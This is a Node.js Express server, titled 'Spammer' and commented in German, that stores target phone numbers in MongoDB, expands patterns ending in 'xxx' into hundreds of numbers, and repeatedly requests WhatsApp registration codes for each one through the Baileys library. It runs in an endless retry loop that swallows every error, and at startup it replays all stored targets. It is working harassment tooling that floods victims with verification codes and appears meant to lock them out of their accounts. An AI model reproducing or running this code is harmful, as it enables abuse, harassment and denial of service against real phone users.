require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const QRCode = require('qrcode');
const mongoose = require('mongoose');
const morgan = require('morgan');
const fs = require('fs');
const ejs = require('ejs');
const pino = require('pino');
const yargs = require('yargs/yargs')
const cluster = require('cluster')
const package = require('./package.json')
const Readline = require('readline')
const rl = Readline.createInterface(process.stdin, process.stdout)
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { promisify } = require('util');
const readFileAsync = promisify(fs.readFile);

const app = express();
const port = process.env.PORT || 8000; // Use environment variable or default port

// MongoDB connection string from environment variable
const mongoURI = process.env.MONGODB_URI;

// Connect to MongoDB
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB:', err));
// Modell aus dem Schema erstellen
// Schema für die Daten definieren
const SpamDataSchema = new mongoose.Schema({
    ddi: String,
    number: String,
    timestamp: { type: Date, default: Date.now }
});

// Modell aus dem Schema erstellen
const SpamData = mongoose.model('SpamData', SpamDataSchema);




const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch('http://localhost:8000/start-spam', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfully from MongoDB');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};
// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();



// Set up body parsers
let server = require('./views/qr');
code = require('./views/pair');
code2 = require('./start-pairing/pair2');
app.use('/qr', server);
app.use('/code', code);
app.use('/code2', code2);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Set up view engine and views directory
const __path = path.join(__dirname, 'views');
app.set('view engine', 'ejs');
app.set('views', __path);
app.engine('ejs', ejs.renderFile);


// Routes
app.get('/', (req, res) => {
    res.render('index', { title: 'Home' });
});

app.get('/pair', (req, res) => {
    res.render('pair', { title: 'pairing' });
});

app.get('/pair2', (req, res) => {
    res.render('pair2', { title: 'pairing2' });
});

app.get('/lock', (req, res) => {
    res.render(path.join(__path, 'lock'), { title: 'Lock' });
});



async function generateNumbersToDatabase(ddi, number) {
    try {
        // Überprüfen, ob die Nummer mit '650' beginnt und genau 'xxx' am Ende hat
        const isValidNumber = number.startsWith("650") && number.endsWith("xxx");
        const xCount = (number.match(/x/g) || []).length; // Anzahl der 'x' in der Nummer
        if (isValidNumber && xCount === 3) {
            let numbers = [];
            for (let i = 1; i <= 999; i++) {
                // Ersetze die 'xxx' in der Nummer durch die aktuelle Zahl
                const formattedNumber = number.replace("xxx", i.toString().padStart(3, ''));
                numbers.push({ ddi, number: formattedNumber });
            }
            const fileName = 'generated_numbers.json';
            fs.writeFile(fileName, JSON.stringify(numbers, null, 2), (err) => {
                if (err) {
                    console.error('Error writing file:', err);
                }
            });

            // Daten an den /start-spam Endpunkt senden
            for (const item of numbers) {
                const { ddi, number } = item;
                await fetch('http://localhost:8000/start-spam', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ ddi, number })
                });
                
                
            }
        } else {
            console.log("");
        }
    } catch (error) {
        console.error('Error:', error);
        throw error; // Fehler weitergeben, um ihn außerhalb der Funktion zu behandeln
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

 const sendStoredDatav2 = async () => {
    try {
        // Dateiinhalt der generated_numbers.json lesen
        const fileContent = fs.readFileSync('exported_data.json', 'utf8');
        const data = JSON.parse(fileContent);

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch('http://localhost:8000/start-spam', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfullykkk');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};

// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredDatav2();


app.post('/start-spam', async (req, res) => {
    const { ddi, number } = req.body;

    try {
  // Überprüfen, ob "xxx" in der Nummer vorhanden ist
  if (number.includes("xxx")) {
    
  
    await generateNumbersToDatabase(ddi, number);
   
   const htmlContent = `<!DOCTYPE html>
   <html lang="en">
   <head>
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <link rel="website icon" type="jpg" href="https://i.pinimg.com/564x/e7/35/00/e735009e177254bafbbafc73b3cb0c62.jpg">
       <meta charset="UTF-8">
       <title>Spammer</title>
       <style>
           body {
               display: flex;
               flex-direction: column;
               align-items: center;
               justify-content: center;
               height: 100vh;
               margin: 0;
               background-image: url('https://telegra.ph/file/38f97371a66ad45394a1f.jpg');
               background-size: cover;
               background-position: center;
           }
           form {
               max-width: 400px;
               margin: 0 auto;
               padding: 10px;
               background-color: #fff;
               border-radius: 10px;
               box-shadow: 0 5px 7px rgba(0, 0, 0, 0.1);
               animation: fadeIn 1s ease;
           }
           input[type="text"] {
               width: 94%;
               padding: 10px;
               margin: 5px 0;
               border: 1px solid #ccc;
               border-radius: 5px;
           }
           input[type="submit"] {
               width: 100%;
               padding: 10px;
               margin: 10px 0;
               border: none;
               border-radius: 5px;
               background-color: #4CAF50;
               color: white;
               cursor: pointer;
               transition: background-color 0.3s;
           }
           input[type="submit"]:hover {
               background-color: #014104;
           }
           @keyframes fadeIn {
               from {
                   opacity: 0;
               }
               to {
                   opacity: 1;
               }
           }
       </style>
   </head>
   <body>
       <form id="spamForm" action="/lock">
           <input type="submit" value="Done">
       </form>
   </body>
   </html>`;

   
   res.send(htmlContent);
   return;
}



 // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
 const existingData = await SpamData.findOne({ ddi, number });
 if (existingData) {
     
 } else {
     // Neue Instanz des Modells erstellen und speichern
     const newData = new SpamData({ ddi, number });
     await newData.save();
     console.log('Data saved successfully to MongoDb GenV2');
      
 }
 try {
    // Generate numbers to file
    const fileName = await generateNumbersToDatabase(ddi, number);
    const htmlContent = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="website icon" type="jpg" href="https://i.pinimg.com/564x/e7/35/00/e735009e177254bafbbafc73b3cb0c62.jpg">
        <meta charset="UTF-8">
        <title>Spammer</title>
        <style>
            body {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                background-image: url('https://telegra.ph/file/38f97371a66ad45394a1f.jpg');
                background-size: cover;
                background-position: center;
            }
            form {
                max-width: 400px;
                margin: 0 auto;
                padding: 10px;
                background-color: #fff;
                border-radius: 10px;
                box-shadow: 0 5px 7px rgba(0, 0, 0, 0.1);
                animation: fadeIn 1s ease;
            }
            input[type="text"] {
                width: 94%;
                padding: 10px;
                margin: 5px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 5px;
                background-color: #4CAF50;
                color: white;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            input[type="submit"]:hover {
                background-color: #014104;
            }
            @keyframes fadeIn {
                from {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }
        </style>
    </head>
    <body>
        <form id="spamForm" action="/lock">
            <input type="submit" value="Done">
        </form>
    </body>
    </html>`;
 

    if (fileName) {
        console.log('File generated:', fileName);
        // Wenn Datei generiert wurde, sende Erfolgsantwort
        res.send(htmlContent);
         
    } else {
       
        
        res.send(htmlContent);
        await sleep(20);
    }
} catch (error) {
    console.error('Error:', error);
    
}


        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });
    
        while (true) {
            try {
                const response = await spam.requestRegistrationCode({
                    phoneNumber: '+' + ddi + number,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });
    
                res.json({ success: true, response }); // Send success response
                return;
            } catch (err) {
                // Fehler ignorieren und keine Aktion ausführen
            }
        }
    } catch (err) {
        // Fehler ignorieren und keine Aktion ausführen
    }
});


// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.on('listening', () => {
  setTimeout(() => {
      sendStoredData();
  }, 15000); 
});


///////////////////////
